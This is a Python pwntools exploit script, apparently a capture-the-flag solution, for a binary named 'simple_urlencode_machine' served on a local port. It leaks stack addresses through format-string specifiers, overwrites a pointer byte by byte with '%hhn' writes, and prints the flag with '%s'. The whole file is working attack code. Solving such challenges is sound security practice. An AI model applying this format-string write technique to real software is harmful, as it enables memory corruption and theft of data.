from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

flag_addr = 0x0000000004040a0

# r = process('./simple_urlencode_machine')
r = remote('127.0.0.1', 50005)

r.sendafter(b'> ', b'\x143$p')
r.recvline()
r.sendafter(b'> ', b'a')
main_rsp = int(r.recvline().strip().split(b'> a')[1], 16) - 0x118
info(f'main rsp : {hex(main_rsp)}')

r.sendafter(b'> ', b'\x173$p')
r.recvline()
r.sendafter(b'> ', b'a')
target = int(r.recvline().strip().split(b'> a')[1], 16) & 0xfffffffffffffff0
info(f'target : {hex(target)}')

for i in range(8):
    r.sendlineafter(b'> ', b'a' * ((target & 0xff) - 1 + i) + b'\x143$hhn')
    r.recvline()
    r.sendafter(b'> ', b'a' * ((target & 0xff) + i))
    r.recvline()
    byte = (flag_addr >> (i * 8)) & 0xff
    if byte == 0:
        r.sendlineafter(b'> ', b'%' * (0x100 // 3) + b'\x173$hhn')
        r.recvline()
        r.sendafter(b'> ', b'%' * (0x100 // 3) + b'a')
        r.recvline()
    else:
        r.sendlineafter(b'> ', b'a' * (byte - 1) + b'\x173$hhn')
        r.recvline()
        r.sendafter(b'> ', b'a' * byte)
        r.recvline()
r.sendlineafter(b'> ', b'a' * ((target & 0xff) - 1) + b'\x143$hhn')
r.recvline()
r.sendafter(b'> ', b'a' * ((target & 0xff)))
r.recvline()

target_idx = (target - main_rsp) // 8 + 138
r.sendlineafter(b'> ', b'\x00' + str(target_idx).encode() + b'$s')
r.recvline()
r.sendafter(b'> ', b'a')

r.interactive()